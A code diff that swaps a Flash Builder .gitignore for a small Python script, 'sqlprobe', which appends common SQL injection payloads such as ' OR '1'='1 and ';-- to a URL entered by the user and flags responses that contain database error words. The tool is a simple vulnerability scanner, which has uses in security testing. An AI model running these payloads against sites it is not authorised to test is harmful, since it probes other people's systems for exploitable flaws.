@@ -1,18 +1,28 @@
-# Build and Release Folders
-bin-debug/
-bin-release/
-[Oo]bj/
-[Bb]in/
+import requests
 
-# Other files and folders
-.settings/
+# Oddiy payloadlar
+payloads = ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "';--", "\";--"]
 
-# Executables
-*.swf
-*.air
-*.ipa
-*.apk
+def scan_sql_injection(url):
+    print(f"🔍 Scanning URL: {url}")
+    vulnerable = False
 
-# Project files, i.e. `.project`, `.actionScriptProperties` and `.flexProperties`
-# should NOT be excluded as they contain compiler settings and other important
-# information for Eclipse / Flash Builder.
+    for payload in payloads:
+        test_url = url + payload
+        try:
+            res = requests.get(test_url, timeout=5)
+            if "sql" in res.text.lower() or "syntax" in res.text.lower() or "mysql" in res.text.lower():
+                print(f"⚠️ Possible vulnerability found with payload: {payload}")
+                vulnerable = True
+        except requests.exceptions.RequestException as e:
+            print(f"⚠️ Error during request: {e}")
+    
+    if not vulnerable:
+        print("✅ No obvious SQL injection patterns found.")
+
+if __name__ == "__main__":
+    print("🛡️ sqlprobe — Basic SQL Injection Scanner")
+    target = input("🌐 Enter target URL (e.g., http://example.com/page.php?id=): ")
+    scan_sql_injection(target)
+
+
